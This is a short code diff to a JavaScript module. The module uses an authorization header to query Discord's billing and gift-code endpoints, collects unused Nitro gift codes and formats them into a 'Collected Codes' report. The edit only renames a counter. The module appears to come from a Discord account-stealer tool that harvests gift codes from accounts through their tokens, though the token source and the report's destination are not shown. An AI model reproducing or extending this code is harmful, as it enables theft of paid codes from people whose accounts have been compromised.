@@ -159,7 +159,7 @@ module.exports = {
     let data = []
     let codes = []
     let codeString = ""
-    let codesCount = 0
+    let counter = 0
     // Get all billing
     for (let i in billings) {
       let bill = billings[i]
@@ -174,10 +174,8 @@ module.exports = {
       let found = data[i]
       let response = await fetch('https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id='+found.id+'&subscription_plan_id='+found.subscription,auth)
       response = await response.json()
-      let counter = 0
       codeString += "\n` [SKU] ` "+found.id+"\n` [PLAN] ` "+found.subscription+"\n"
       for (let i in response) {
-        codesCount++
         if (!codes.find(c => c == response[i].code) && response[i].uses == 0) {
           codes.push(response[i].code)
           counter++
@@ -185,6 +183,6 @@ module.exports = {
         }
       }
     }
-    return { message: "` ["+codesCount+"] ` Collected Codes"+codeString}
+    return { message: "` ["+counter+"] ` Collected Codes"+codeString}
   },
 };
